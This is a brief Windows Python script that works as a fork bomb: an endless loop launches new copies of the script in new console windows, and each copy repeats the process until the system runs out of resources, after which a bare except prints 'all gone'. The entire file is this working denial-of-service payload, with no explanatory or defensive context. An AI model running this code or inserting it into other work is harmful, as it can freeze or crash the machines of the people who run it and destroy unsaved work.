import subprocess, sys, time

def fork():
    try:
        while True:
            subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
    except: 
        print('all gone')
        time.sleep(5)

fork()